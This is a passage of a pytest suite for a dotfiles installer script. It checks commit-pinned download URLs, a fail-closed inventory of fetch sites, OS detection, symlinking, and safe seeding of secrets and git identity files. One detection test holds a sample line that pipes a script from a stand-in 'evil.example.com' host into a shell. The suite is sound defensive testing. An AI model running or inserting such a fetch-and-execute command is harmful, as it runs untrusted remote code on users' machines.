"""Tests for install.sh (sourced; main() is guarded and never runs here)."""

import json
import re
import shutil
import subprocess
from pathlib import Path

import pytest
from conftest import REPO_ROOT

INSTALL = REPO_ROOT / "install.sh"


def run_sourced(snippet: str, env: dict, cwd=None):
    script = f'source "{INSTALL}"\n{snippet}\n'
    return subprocess.run(
        ["bash", "-c", script],
        capture_output=True,
        text=True,
        env=env,
        cwd=cwd,
        timeout=120,
    )


# Never stripped by _without_commands: these carry core utilities
# (dirname, touch, sudo, curl, sed, cmp, mktemp, ...) and, for /bin on this
# platform, bash itself. Some dev-machine tools (pip3, vim, zsh) have a
# second copy living in one of these -- e.g. Apple ships /bin/zsh and
# /usr/bin/vim/pip3 alongside the homebrew/pyenv ones -- so blindly
# removing the owning directory for every match can silently take PATH
# lookups (or the bash subprocess itself) down with it.
_PROTECTED_PATH_DIRS = {"/bin", "/usr/bin", "/sbin", "/usr/sbin"}


def _without_commands(env: dict, *names: str) -> dict:
    """Strip real PATH directories that would resolve any of `names`.

    Several tools under test (go, glow, staticcheck, ...) are genuinely
    installed on a developer workstation, so a bare `command -v` check
    would find the real one and mask the very "not installed" branch a
    test wants to exercise. Removing the owning directory makes absence
    real rather than a stubbed override. Stops at a protected system
    directory instead of removing it (see _PROTECTED_PATH_DIRS) -- a
    command with a surviving copy there needs a function-shadow instead
    (see TestChangeShell / TestInstallVimPlugins for zsh/vim).
    """
    env = dict(env)
    for name in names:
        while True:
            found = shutil.which(name, path=env["PATH"])
            if not found:
                break
            parent = Path(found).parent
            if parent.name == "stub-bin":
                # The shared stub dir (which now carries backstop stubs for
                # system-mutating tools) must not be dropped wholesale — that
                # would silently discard every other stub the test set up.
                # Delete just this stub to make the tool absent.
                Path(found).unlink()
                continue
            drop = str(parent)
            if drop in _PROTECTED_PATH_DIRS:
                break
            env["PATH"] = ":".join(p for p in env["PATH"].split(":") if p != drop)
    return env


class TestSourceGuard:
    def test_sourcing_does_not_run_main(self, shell_env):
        res = run_sourced("true", shell_env.env)
        assert res.returncode == 0
        assert res.stdout == ""

    def test_piped_execution_outside_checkout_fails_with_guidance(
        self, shell_env, tmp_path
    ):
        # `cat install.sh | bash` from a non-checkout dir must still reach
        # main() and fail fast with the clone-the-repo error (exit 1),
        # before any package installation is attempted.
        outside = tmp_path / "not-a-checkout"
        outside.mkdir()
        res = subprocess.run(
            ["bash"],
            input=INSTALL.read_text(encoding="utf-8"),
            capture_output=True,
            text=True,
            env=shell_env.env,
            cwd=outside,
            timeout=60,
        )
        assert res.returncode == 1
        assert "Dotfiles repository not found" in res.stdout


class TestPinnedUpstreamRefs:
    """Bootstrap scripts fetched from GitHub must name an immutable commit.

    A raw.githubusercontent.com URL on HEAD/master executes whatever is there
    at run time, so the bytes handed to a shell (twice, to root) can change
    between two runs with no signal. A commit SHA already identifies its
    content cryptographically, which is why pinning the ref is enough and no
    separate checksum table is kept. These tests fail if a pin is ever reverted
    to a branch -- the drift would otherwise be invisible.
    """

    GITHUB_RAW = re.compile(
        r"https://raw\.githubusercontent\.com/[^/\s\"']+/[^/\s\"']+/([^/\s\"']+)/"
    )

    def test_every_github_raw_url_is_pinned_to_a_commit(self):
        text = INSTALL.read_text(encoding="utf-8")
        # Only the URLs actually fetched at run time matter; the refresh
        # recipe in the pin comment names repos, not raw URLs, so it is not
        # matched here.
        for ref in self.GITHUB_RAW.findall(text):
            if ref.startswith("$"):  # interpolated pin variable
                continue
            assert re.fullmatch(r"[0-9a-f]{40}", ref), (
                f"unpinned github raw ref {ref!r} in install.sh: "
                "use a 40-char commit SHA, not a branch"
            )

    @pytest.mark.parametrize(
        "var",
        [
            "HOMEBREW_INSTALL_REF",
            "LAZYDOCKER_INSTALL_REF",
            "OHMYZSH_INSTALL_REF",
            "VIM_PLUG_REF",
        ],
    )
    def test_pin_variable_holds_a_commit_sha(self, var):
        text = INSTALL.read_text(encoding="utf-8")
        match = re.search(rf'^{var}="([^"]*)"', text, re.MULTILINE)
        assert match, f"{var} is not defined in install.sh"
        assert re.fullmatch(r"[0-9a-f]{40}", match.group(1)), (
            f"{var} must be a 40-char commit SHA, got {match.group(1)!r}"
        )

    @pytest.mark.parametrize(
        "var",
        [
            "HOMEBREW_INSTALL_REF",
            "LAZYDOCKER_INSTALL_REF",
            "OHMYZSH_INSTALL_REF",
            "VIM_PLUG_REF",
        ],
    )
    def test_pin_variable_is_actually_used(self, var):
        # A pin nobody interpolates is worse than none: it reads as verified
        # while the fetch still rides a branch.
        text = INSTALL.read_text(encoding="utf-8")
        assert f"${var}/" in text, f"{var} is defined but never used in a URL"


class TestFetchSiteInventory:
    """Enumerate every fetch site in install.sh, not every known threat.

    TestPinnedUpstreamRefs above verifies the pins that exist. It cannot see a
    fetch that was never pinned in the first place, because its regex only
    matches raw.githubusercontent.com. That asymmetry is how three `git clone`
    calls (tpm, zsh-autosuggestions, zsh-syntax-highlighting) and one
    `uvx --from git+https://` (serena) came to sit outside both the pin policy
    and its test, while the policy comment at the top of install.sh recites a
    fetch inventory that does not mention any of them.

    This test inverts the direction of enumeration: it starts from every
    https:// URL appearing in an executable (non-comment) line of install.sh
    and requires each one to be classified into exactly one bucket. A fetch
    added tomorrow lands in no bucket and fails here by default -- forcing a
    deliberate decision instead of a silent omission. That is the whole point;
    the buckets below are bookkeeping, the fail-closed default is the guard.

    What this deliberately does NOT cover, so its green is not read as more
    than it is: package-manager installs. `go install <mod>@latest` (the
    install_glow and install_linters_formatters functions in install.sh) and
    `npm install -g <pkg>` do fetch code at a floating version, but their
    registries verify what arrives on their own -- Go checks the module
    against the checksum database, npm against the registry's integrity hash
    -- so the exposure there is a moving version, not unverified bytes. The
    "separate trust paths" note in install.sh's fetch-inventory header
    comment scopes apt out for the same reason. Folding them in would merge
    two different trust models into one bucket and make the result harder to
    reason about, not easier; auditing floating versions is a separate guard,
    not this one.
    """

    # Pins live in these variables; a URL interpolating one is pinned. A bare
    # 40-char SHA path segment counts too, so an inline pin is not a false
    # negative just because it skipped the variable.
    PIN_VARS = (
        "HOMEBREW_INSTALL_REF",
        "LAZYDOCKER_INSTALL_REF",
        "OHMYZSH_INSTALL_REF",
        "VIM_PLUG_REF",
    )

    # Fetches deliberately left unpinned, with the reason install.sh:52-56
    # gives: these vendor redirectors expose no immutable ref, so pinning them
    # would mean a content hash re-pinned on every upstream release.
    UNPINNED_BY_DESIGN = {
        "https://astral.sh/uv/install.sh": "vendor redirector, no immutable ref",
        "https://pyenv.run": "vendor redirector, no immutable ref",
        "https://get.docker.com": "vendor redirector, no immutable ref (runs via sudo sh)",
        "https://deb.nodesource.com/setup_lts.x": (
            "vendor redirector, no immutable ref (runs via sudo -E bash)"
        ),
        # apt keyring / repository URLs. The "separate trust paths" note in
        # install.sh's fetch-inventory header comment scopes these out: dearmoring
        # a key or adding a sources.list entry is not the same as executing
        # fetched bytes, and pinning a raw GitHub ref would not address either.
        "https://apt.fury.io/wez/gpg.key": "apt keyring, separate trust path",
        "https://apt.fury.io/wez/": "apt repository, separate trust path",
        "https://cli.github.com/packages/githubcli-archive-keyring.gpg": (
            "apt keyring, separate trust path"
        ),
        "https://cli.github.com/packages": "apt repository, separate trust path",
    }

    # Unpinned fetches that are NOT a considered decision -- they were simply
    # never counted. Kept separate from UNPINNED_BY_DESIGN on purpose: this
    # bucket is a worklist, not a blessing. Pin an entry (or move it above with
    # a stated reason) and delete it from here; test_open_findings_are_current
    # fails if a listed URL is gone, so the list cannot rot into a fiction.
    UNPINNED_OPEN_FINDINGS = {
        "https://github.com/tmux-plugins/tpm": "git clone of branch HEAD",
        "https://github.com/zsh-users/zsh-autosuggestions": (
            "git clone of branch HEAD; runs on every interactive shell start"
        ),
        "https://github.com/zsh-users/zsh-syntax-highlighting": (
            "git clone of branch HEAD; runs on every interactive shell start"
        ),
        "https://github.com/oraios/serena": (
            "uvx --from git+https of branch HEAD; runs as an MCP server every session"
        ),
    }

    # Editing this set is what makes a change to the open findings visible in
    # review: growing the bucket, or swapping one finding for another without
    # changing the count, both fail here until this literal is edited too.
    # Being honest about its strength -- both sides are hand-maintained in this
    # file, so this is a trip-wire that forces a second deliberate edit, not an
    # independent check. The independent checks are the two above it:
    # test_every_fetch_url_is_classified reads install.sh, and
    # test_listed_urls_are_still_present fails once a listed URL is gone.
    EXPECTED_OPEN_FINDINGS = frozenset(
        {
            "https://github.com/tmux-plugins/tpm",
            "https://github.com/zsh-users/zsh-autosuggestions",
            "https://github.com/zsh-users/zsh-syntax-highlighting",
            "https://github.com/oraios/serena",
        }
    )

    # URL-shaped tokens that appear in executable lines but are never fetched:
    # the first two are printed for the user to open by hand, the third is not
    # a URL at all but a printf FORMAT whose %s is a hostname. The scanner
    # matches on shape, so a format string reads as a URL to it; classifying it
    # here is the sanctioned answer (the failure message says so) and keeps the
    # fail-closed default intact for anything genuinely new. Do not "fix" this
    # by rewriting the printf to hide the token -- every spelling that builds an
    # https:// config key looks the same to a shape matcher, and hiding it would
    # only teach the next author to evade the guard.
    NOT_FETCHED = {
        "https://checkstyle.sourceforge.io/",
        "https://github.com/google/google-java-format",
        "https://%s",
    }

    # http:// is matched too, so downgrading a fetch to plaintext cannot slip
    # past by falling out of the pattern -- a new http:// URL lands in no
    # bucket and fails, which is the signal worth having.
    #
    # Known scope limits, stated rather than papered over: a URL assembled
    # from variables (`curl "$BASE/x.sh"`), an ssh remote
    # (`git clone git@github.com:o/r`), or a scheme-less host is invisible
    # here. Closing those means parsing shell, and a parser large enough to do
    # it becomes its own bug surface -- the fetches this file actually makes
    # are all literal URLs, and a future one that is not should be caught in
    # review. Revisit if that stops being true.
    URL = re.compile(r"https?://[^\s\"'|)\\]+")

    @classmethod
    def _urls_in_executable_lines(cls, text: str) -> dict[str, int]:
        """Map each https:// URL to the first executable line it appears on.

        Comment-only lines are skipped so the pin-refresh recipe and the policy
        prose at install.sh:35-79 do not register as fetches. Lines with a
        trailing comment are NOT stripped: erring toward including a URL keeps
        this fail-closed, which is the property worth protecting.
        """
        found: dict[str, int] = {}
        for lineno, line in enumerate(text.splitlines(), 1):
            if line.lstrip().startswith("#"):
                continue
            for raw in cls.URL.findall(line):
                found.setdefault(raw.rstrip(".,;"), lineno)
        return found

    @classmethod
    def _is_pinned(cls, url: str) -> bool:
        # Keep a pinned URL on one line. Wrapping one across a `\` continuation
        # truncates the fragment this sees, so the pin stops being recognised
        # and the URL starts failing as unclassified -- a confusing way to
        # learn that reformatting broke nothing real.
        if any(f"${var}/" in url for var in cls.PIN_VARS):
            return True
        return bool(re.search(r"/[0-9a-f]{40}(/|$)", url))

    def test_every_fetch_url_is_classified(self):
        found = self._urls_in_executable_lines(INSTALL.read_text(encoding="utf-8"))
        known = (
            set(self.UNPINNED_BY_DESIGN)
            | set(self.UNPINNED_OPEN_FINDINGS)
            | self.NOT_FETCHED
        )
        unclassified = {
            url: line
            for url, line in found.items()
            if not self._is_pinned(url) and url not in known
        }
        assert not unclassified, (
            "install.sh fetches a URL this inventory does not account for: "
            + ", ".join(
                f"{url} (install.sh:{line})"
                for url, line in sorted(unclassified.items())
            )
            + ". Pin it, or add it to UNPINNED_BY_DESIGN with a reason, or to "
            "NOT_FETCHED if it is only printed."
        )

    def test_open_findings_match_the_reviewed_set(self):
        assert set(self.UNPINNED_OPEN_FINDINGS) == self.EXPECTED_OPEN_FINDINGS, (
            "the open-findings bucket changed; pin the fetch instead of filing it "
            "here if you can, and update EXPECTED_OPEN_FINDINGS deliberately if you cannot"
        )

    @pytest.mark.parametrize("bucket", ["UNPINNED_BY_DESIGN", "UNPINNED_OPEN_FINDINGS"])
    def test_listed_urls_are_still_present(self, bucket):
        # A bucket entry for a URL install.sh no longer fetches reads as a live
        # exception while covering nothing, and hides that the finding was fixed.
        text = INSTALL.read_text(encoding="utf-8")
        for url in getattr(self, bucket):
            assert url in text, (
                f"{bucket} lists {url}, which install.sh no longer references"
            )

    def test_detects_an_unaccounted_fetch(self):
        # The guard has to fail on something it has never seen, or the green
        # above only proves the buckets match today's file.
        snippet = "curl -fsSL https://evil.example.com/x.sh | sh\n# https://commented.example.com\n"
        found = self._urls_in_executable_lines(snippet)
        assert found == {"https://evil.example.com/x.sh": 1}
        assert not self._is_pinned("https://evil.example.com/x.sh")

    def test_recognises_both_pin_forms(self):
        assert self._is_pinned(
            "https://raw.githubusercontent.com/junegunn/vim-plug/$VIM_PLUG_REF/plug.vim"
        )
        assert self._is_pinned("https://example.com/" + "a" * 40 + "/install.sh")
        assert not self._is_pinned("https://example.com/master/install.sh")


class TestDetectOs:
    def test_darwin_is_macos(self, shell_env):
        # OSTYPE を明示して host OS に依存しない（Linux CI 上でも成立させる）
        res = run_sourced('OSTYPE=darwin24 detect_os && echo "OS=$OS"', shell_env.env)
        assert "Detected OS: macos" in res.stdout
        assert "OS=macos" in res.stdout

    def test_linux_gnu_without_debian_marker_is_linux(self, shell_env):
        # debian マーカーを不在パスに差し替え、host に /etc/debian_version が
        # あっても linux 分岐を確定的に検証する
        res = run_sourced(
            "OSTYPE=linux-gnu DEBIAN_VERSION_FILE=/nonexistent "
            'detect_os && echo "OS=$OS"',
            shell_env.env,
        )
        assert "OS=linux" in res.stdout

    def test_linux_gnu_with_debian_marker_is_ubuntu(self, shell_env, tmp_path):
        marker = tmp_path / "debian_version"
        marker.write_text("13\n", encoding="utf-8")
        res = run_sourced(
            f'OSTYPE=linux-gnu DEBIAN_VERSION_FILE="{marker}" '
            'detect_os && echo "OS=$OS"',
            shell_env.env,
        )
        assert "OS=ubuntu" in res.stdout

    def test_msys_is_windows(self, shell_env):
        res = run_sourced('OSTYPE=msys detect_os && echo "OS=$OS"', shell_env.env)
        assert "OS=windows" in res.stdout

    def test_wsl_distro_name_does_not_override_ubuntu_detection(
        self, shell_env, tmp_path
    ):
        # WSL always reports OSTYPE=linux-gnu, so it is caught by the
        # linux-gnu branch (and classified ubuntu/linux there) before the
        # windows branch is ever reached. Setting WSL_DISTRO_NAME must not
        # flip detection to "windows" -- this locks in the longstanding
        # "WSL is treated as Ubuntu" behavior after removing the dead
        # WSL_DISTRO_NAME check from the windows branch.
        marker = tmp_path / "debian_version"
        marker.write_text("13\n", encoding="utf-8")
        res = run_sourced(
            f'OSTYPE=linux-gnu WSL_DISTRO_NAME=Ubuntu DEBIAN_VERSION_FILE="{marker}" '
            'detect_os && echo "OS=$OS"',
            shell_env.env,
        )
        assert "OS=ubuntu" in res.stdout

    def test_unknown_os_fails(self, shell_env):
        res = run_sourced("OSTYPE=solaris detect_os", shell_env.env)
        assert res.returncode == 1
        assert "Unsupported operating system" in res.stdout


class TestCreateSymlinks:
    def test_links_backups_and_copies(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        (home / ".zshrc").write_text("old content\n", encoding="utf-8")
        # A stale symlink must be replaced without being backed up.
        (home / ".vimrc").symlink_to("/nonexistent-target")

        # link_oh_my_zsh_theme is split out of create_symlinks (see
        # TestOhMyZshFreshInstallOrdering) and is only called after
        # install_oh_my_zsh in main(); call it explicitly here since this
        # test asserts on the theme symlink it produces.
        res = run_sourced("create_symlinks && link_oh_my_zsh_theme", shell_env.env)
        assert res.returncode == 0

        # Top-level dotfiles are symlinked into the repo.
        for name in (".zshrc", ".vimrc", ".tmux.conf", ".gitconfig", ".wezterm.lua"):
            link = home / name
            assert link.is_symlink(), f"{name} should be a symlink"
            assert link.resolve() == (REPO_ROOT / name).resolve()

        # Claude / Gemini entries are symlinked individually.
        assert (home / ".claude/settings.json").is_symlink()
        assert (home / ".claude/hooks").is_symlink()
        assert (home / ".gemini/settings.json").is_symlink()
        assert (home / ".config/nvim").resolve() == (
            REPO_ROOT / ".config/nvim"
        ).resolve()

        # Codex resolves symlinks when scanning agents/ and skills/, so both
        # are linked as whole directories rather than copied.
        assert (home / ".codex/AGENTS.md").is_symlink()
        assert (home / ".codex/hooks").is_symlink()
        for name in ("agents", "skills"):
            link = home / ".codex" / name
            assert link.is_symlink(), f".codex/{name} should be a symlink"
            assert link.resolve() == (REPO_ROOT / ".codex" / name).resolve()

        # A shared skill resolves through BOTH hops -- the linked skills dir and
        # the repo's own .codex/skills/<name> -> ../../.claude/skills/<name>
        # link -- landing on the single source of truth under .claude/skills.
        skill = home / ".codex/skills/backend-patterns"
        assert skill.is_dir()
        assert (
            skill.resolve() == (REPO_ROOT / ".claude/skills/backend-patterns").resolve()
        )
        assert (skill / "SKILL.md").is_file()

        # Oh My Zsh custom dir stays a REAL directory (install_oh_my_zsh
        # clones plugins into custom/plugins/); only the theme file(s)
        # tracked in the repo are symlinked in.
        assert not (home / ".oh-my-zsh/custom").is_symlink()
        assert (home / ".oh-my-zsh/custom").is_dir()
        theme_link = home / ".oh-my-zsh/custom/themes/px-rose-pine.zsh-theme"
        assert theme_link.is_symlink()
        assert (
            theme_link.resolve()
            == (REPO_ROOT / ".oh-my-zsh/custom/themes/px-rose-pine.zsh-theme").resolve()
        )
        assert (home / ".tmux/tmux_send_to_all_except_nvim.sh").is_symlink()

        # The pre-existing real .zshrc was backed up; the stale symlink was not.
        backups = list(home.glob(".dotfiles_backup_*"))
        assert len(backups) == 1
        assert (backups[0] / ".zshrc").read_text(encoding="utf-8") == "old content\n"
        assert not (backups[0] / ".vimrc").exists()

    # --- Codex config.toml: seeded, never linked, never clobbered -----------
    # Codex owns this file at runtime: `codex mcp add` writes mcp_servers into
    # it, Authorization headers included, plus projects/ and plugin state. The
    # old symlink pointed it straight at the checkout, so everything Codex
    # wrote landed in the working tree, one `git add` from committing a token.

    def test_codex_config_is_seeded_as_a_real_file_not_a_symlink(self, shell_env):
        home = shell_env.home
        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0

        config = home / ".codex/config.toml"
        assert config.is_file()
        assert not config.is_symlink(), (
            "config.toml must never be a symlink: Codex would write secrets "
            "straight into the checkout"
        )
        assert config.read_text(encoding="utf-8") == (
            REPO_ROOT / ".codex/config.toml.template"
        ).read_text(encoding="utf-8")

    def test_codex_config_written_by_codex_survives_a_rerun(self, shell_env):
        """The whole point: re-rendering would delete the user's MCP servers."""
        home = shell_env.home
        (home / ".codex").mkdir(parents=True)
        live = home / ".codex/config.toml"
        live.write_text(
            '[mcp_servers.github.http_headers]\nAuthorization = "secret"\n',
            encoding="utf-8",
        )

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0
        assert 'Authorization = "secret"' in live.read_text(encoding="utf-8")

    def test_codex_config_symlink_is_replaced_with_a_real_file(self, shell_env):
        """Self-heal the older install that linked it into the checkout."""
        home = shell_env.home
        (home / ".codex").mkdir(parents=True)
        (home / ".codex/config.toml").symlink_to(
            REPO_ROOT / ".codex/config.toml.template"
        )

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0

        config = home / ".codex/config.toml"
        assert config.is_file()
        assert not config.is_symlink()

    # --- ~/.zsh_secrets: seeded in $HOME, never in the checkout -------------
    # ~/.zshrc is a symlink into the repo, so an `export API_KEY=...` added to
    # it is edited inside the working tree and one `git add` from being
    # committed. The seeded file is the sanctioned place for those exports.

    def test_zsh_secrets_is_seeded_outside_the_checkout_owner_readable_only(
        self, shell_env
    ):
        home = shell_env.home
        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr

        secrets = home / ".zsh_secrets"
        assert secrets.is_file()
        assert not secrets.is_symlink(), (
            "a symlink would put the user's API keys inside the checkout"
        )
        # 0600: the umask subshell must leave no window where the file is
        # group/world readable.
        assert secrets.stat().st_mode & 0o077 == 0
        # Nothing by this name may appear in the repo itself.
        assert not (REPO_ROOT / ".zsh_secrets").exists()

    def test_zsh_secrets_is_never_overwritten(self, shell_env):
        """The whole point: a re-run must not wipe the keys already in it."""
        home = shell_env.home
        secrets = home / ".zsh_secrets"
        secrets.write_text("export GEMINI_API_KEY=real-key\n", encoding="utf-8")

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert secrets.read_text(encoding="utf-8") == "export GEMINI_API_KEY=real-key\n"
        # Not backed up either -- it was never replaced, so there is nothing
        # to move aside.
        assert not any(p.exists() for p in home.glob(".dotfiles_backup_*/.zsh_secrets"))

    # `[ -e ]` is false for a symlink whose target is gone, so a redirected
    # secrets file (an encrypted volume, a synced folder) looked absent and the
    # seed wrote THROUGH the link. With the target's parent missing that write
    # failed under set -e and the installer died with no [ERROR] line, before
    # git config, the editor/Claude/Codex links, packages and chsh; with the
    # parent present it planted a stub at a location the user chose for their
    # real keys. The redirect is the user's either way: leave it untouched.
    @pytest.mark.parametrize("parent_exists", [False, True])
    def test_zsh_secrets_dangling_symlink_is_left_alone(
        self, shell_env, tmp_path, parent_exists
    ):
        home = shell_env.home
        target_dir = tmp_path / "unmounted-volume"
        if parent_exists:
            target_dir.mkdir()
        target = target_dir / "zsh_secrets"
        secrets = home / ".zsh_secrets"
        secrets.symlink_to(target)

        res = run_sourced("create_symlinks", shell_env.env)

        assert res.returncode == 0, res.stderr
        assert secrets.is_symlink() and secrets.readlink() == target
        assert not target.exists(), "the seed was written through the user's link"
        assert "dangling" in res.stdout + res.stderr
        # The steps after the seed still ran.
        assert (home / ".config/git/os.gitconfig").is_file()

    # --- Git identity: rendered per machine, never tracked ------------------

    def test_git_identity_is_inherited_from_the_previous_config(
        self, shell_env, tmp_path
    ):
        """Upgrading from a ~/.gitconfig that carried [user] keeps it."""
        prior = tmp_path / "prior-gitconfig"
        prior.write_text(
            "[user]\n\tname = Prior Person\n\temail = prior@example.com\n",
            encoding="utf-8",
        )
        env = {**shell_env.env, "GIT_CONFIG_GLOBAL": str(prior)}

        res = run_sourced("create_symlinks", env)
        assert res.returncode == 0

        rendered = (shell_env.home / ".config/git/user.gitconfig").read_text(
            encoding="utf-8"
        )
        assert "name = Prior Person" in rendered
        assert "email = prior@example.com" in rendered

    def test_git_identity_is_inherited_through_an_include(self, shell_env, tmp_path):
        """A [user] pulled in by [include] is part of the identity git resolves.

        `git config --global <key>` does not follow includes -- git only does
        that by default when no file or scope is named -- so the common
        `[include] path = ~/.gitconfig.local` layout read back as empty. The
        .gitconfig link then made that file unreachable, and the identity
        dropped out of the effective config with one warning line.
        """
        local = tmp_path / "gitconfig.local"
        local.write_text(
            "[user]\n\tname = Included Person\n\temail = included@example.com\n",
            encoding="utf-8",
        )
        prior = tmp_path / "prior-gitconfig"
        prior.write_text(f"[include]\n\tpath = {local}\n", encoding="utf-8")
        env = {**shell_env.env, "GIT_CONFIG_GLOBAL": str(prior)}

        res = run_sourced("create_symlinks", env)
        assert res.returncode == 0, res.stderr

        rendered = (shell_env.home / ".config/git/user.gitconfig").read_text(
            encoding="utf-8"
        )
        assert "name = Included Person" in rendered
        assert "email = included@example.com" in rendered

    def test_conditional_include_does_not_leak_into_the_global_identity(
        self, shell_env, tmp_path
    ):
        """--includes also resolves includeIf, against the CURRENT repository.

        install.sh is normally run from inside its own checkout, so a
        `[includeIf "gitdir:~/work/"]` identity -- meant for that directory
        only -- matched whenever the checkout lived under ~/work/, and was
        baked into user.gitconfig as the identity for every repository.
        """
        work_config = tmp_path / "work-config"
        work_config.write_text(
            "[user]\n\tname = Work Person\n\temail = work@example.com\n",
            encoding="utf-8",
        )
        work = tmp_path / "work"
        repo = work / "checkout"
        repo.mkdir(parents=True)
        subprocess.run(["git", "init", "-q", str(repo)], check=True)
        prior = tmp_path / "prior-gitconfig"
        prior.write_text(
            "[user]\n\tname = Personal Person\n\temail = personal@example.com\n"
            f'[includeIf "gitdir:{work}/"]\n\tpath = {work_config}\n',
            encoding="utf-8",
        )
        env = {**shell_env.env, "GIT_CONFIG_GLOBAL": str(prior)}

        res = run_sourced("create_symlinks", env, cwd=repo)
        assert res.returncode == 0, res.stderr

        rendered = (shell_env.home / ".config/git/user.gitconfig").read_text(
            encoding="utf-8"
        )
        assert "email = personal@example.com" in rendered
        assert "work@example.com" not in rendered

    # Same defect as the dangling ~/.zsh_secrets above: `[ -e ]` is false on a
    # broken link, and `git config --file` / the placeholder printf then failed
    # on it (git cannot take the lock) under set -e.
    def test_git_identity_dangling_symlink_is_left_alone(self, shell_env, tmp_path):
        home = shell_env.home
        (home / ".config/git").mkdir(parents=True)
        target = tmp_path / "unmounted-volume/user.gitconfig"
        user_config = home / ".config/git/user.gitconfig"
        user_config.symlink_to(target)
        prior = tmp_path / "prior-gitconfig"
        prior.write_text(
            "[user]\n\tname = Prior Person\n\temail = prior@example.com\n",
            encoding="utf-8",
        )
        env = {**shell_env.env, "GIT_CONFIG_GLOBAL": str(prior)}

        res = run_sourced("create_symlinks", env)

        assert res.returncode == 0, res.stderr
        assert user_config.is_symlink() and user_config.readlink() == target
        assert "dangling" in res.stdout + res.stderr
        assert (home / ".config/nvim").is_symlink(), "later steps did not run"

    def test_git_identity_is_never_overwritten(self, shell_env):
        home = shell_env.home
        (home / ".config/git").mkdir(parents=True)
        existing = home / ".config/git/user.gitconfig"
        existing.write_text("[user]\n\tname = Do Not Touch\n", encoding="utf-8")

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0
        assert existing.read_text(encoding="utf-8") == "[user]\n\tname = Do Not Touch\n"

    def test_git_identity_placeholder_is_inert_when_unknown(self, shell_env):
        """Non-interactive with nothing to inherit: warn, never guess.

        The keys stay commented out -- an empty `name =` would make git report a
        configured-but-blank identity rather than telling the user to set one.
        """
        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0

        rendered = (shell_env.home / ".config/git/user.gitconfig").read_text(
            encoding="utf-8"
        )
        assert "#[user]" in rendered
        for line in rendered.splitlines():
            assert line.startswith("#"), f"placeholder must be inert: {line!r}"

    def test_tracked_gitconfig_carries_no_identity(self):
        """Guard the leak itself, not just the machinery that avoids it."""
        text = (REPO_ROOT / ".gitconfig").read_text(encoding="utf-8")
        # Match the section header, not the substring: the file explains in a
        # comment why [user] is absent, and that comment is not a section.
        sections = [
            ln.strip()
            for ln in text.splitlines()
            if not ln.lstrip().startswith("#") and ln.strip().startswith("[")
        ]
        assert "[user]" not in sections, (
            ".gitconfig must not carry a [user] section: anyone who clones this "
            "repo and links it would commit under the owner's name and address"
        )
        assert "path = ~/.config/git/user.gitconfig" in text

    def test_rerun_is_idempotent(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()

        first = run_sourced("create_symlinks", shell_env.env)
        assert first.returncode == 0
        second = run_sourced("create_symlinks", shell_env.env)
        assert second.returncode == 0

        assert (home / ".zshrc").is_symlink()
        assert (home / ".zshrc").resolve() == (REPO_ROOT / ".zshrc").resolve()
        assert (home / ".codex/skills/backend-patterns").is_dir()

    def test_backup_preserves_files_sharing_a_basename(self, shell_env):
        # settings.json exists as a real file under BOTH ~/.claude and
        # ~/.config/Code/User. A flat, basename-only backup would move the
        # first into $backup_dir/settings.json and then overwrite it with the
        # second, destroying one of the user's real configs. Both must survive.
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        (home / ".claude").mkdir(parents=True)
        (home / ".claude/settings.json").write_text("CLAUDE-REAL\n", encoding="utf-8")
        (home / ".config/Code/User").mkdir(parents=True)
        (home / ".config/Code/User/settings.json").write_text(
            "CODE-REAL\n", encoding="utf-8"
        )

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr

        backups = list(home.glob(".dotfiles_backup_*"))
        assert len(backups) == 1
        recovered = sorted(
            p.read_text(encoding="utf-8") for p in backups[0].rglob("settings.json")
        )
        assert recovered == ["CLAUDE-REAL\n", "CODE-REAL\n"], recovered

    def test_rerun_does_not_accumulate_backup_dirs(self, shell_env):
        # The rendered hooks.json is the one real file install.sh writes under
        # ~/.codex. Re-rendering it unconditionally would back its own previous
        # output into a fresh timestamped dir on every run, so ~/.dotfiles_backup_*
        # would pile up. A second no-change run must leave zero backup dirs.
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()

        first = run_sourced("create_symlinks", shell_env.env)
        assert first.returncode == 0, first.stderr
        second = run_sourced("create_symlinks", shell_env.env)
        assert second.returncode == 0, second.stderr

        assert list(home.glob(".dotfiles_backup_*")) == []
        # The links and rendered file are still in place after the no-op rerun.
        assert (home / ".codex/skills/backend-patterns").is_dir()
        assert (home / ".codex/hooks.json").is_file()

    def test_no_backup_dir_left_when_nothing_backed_up(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0
        # Fresh HOME: nothing real pre-existed, so the timestamped backup dir
        # must have been removed as empty.
        assert list(home.glob(".dotfiles_backup_*")) == []

    def test_migration_off_copies_backs_up_rather_than_deletes(self, shell_env):
        # THE safety invariant, under the linked-directory layout: install.sh
        # never DELETES under $HOME. Upgrading from the old copy-based install
        # finds a REAL ~/.codex/skills, and linking the directory moves the whole
        # thing aside -- our stale copies, Codex's managed .system, and any
        # hand-written skill alike. That is the unavoidable cost of linking the
        # dir rather than its entries, so the entire contents must survive in the
        # backup: this installer runs on other people's machines, where a wrong
        # delete is unrecoverable.
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        skills = home / ".codex/skills"
        (skills / ".system").mkdir(parents=True)
        (skills / ".system/SKILL.md").write_text("codex managed\n", encoding="utf-8")
        (skills / "my-own-skill").mkdir(parents=True)
        (skills / "my-own-skill/SKILL.md").write_text(
            "user authored\n", encoding="utf-8"
        )

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr

        # The destination is now our link into the checkout...
        assert skills.is_symlink()
        assert skills.resolve() == (REPO_ROOT / ".codex/skills").resolve()

        # ...and everything that was there is recoverable, byte for byte.
        backups = list(home.glob(".dotfiles_backup_*"))
        assert len(backups) == 1
        saved = backups[0] / ".codex/skills"
